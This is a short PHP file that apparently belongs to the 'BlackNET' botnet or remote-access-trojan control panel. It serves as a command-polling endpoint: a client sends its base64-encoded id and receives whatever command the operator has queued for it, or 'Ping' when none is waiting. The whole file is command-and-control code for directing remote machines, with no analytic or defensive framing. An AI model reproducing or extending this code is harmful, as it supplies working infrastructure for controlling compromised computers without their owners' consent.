<?php
require_once 'config/config.php';
require_once APP_PATH . 'classes/Database.php';
require_once APP_PATH . 'classes/Utils.php';
require_once APP_PATH . 'classes/Clients.php';

$database = new BlackNET\Database();

$utils = new BlackNET\Utils();

$client = new BlackNET\Clients($database, $utils);

if (isset($_GET['id'])) {
    $clientCommand = $client->getCommand($utils->sanitize($utils->base64DecodeUrl($_GET['id'])));

    if (property_exists($clientCommand, "command")) {
        echo $clientCommand->command;
    } else {
        echo $utils->base64EncodeUrl("Ping");
    }
}
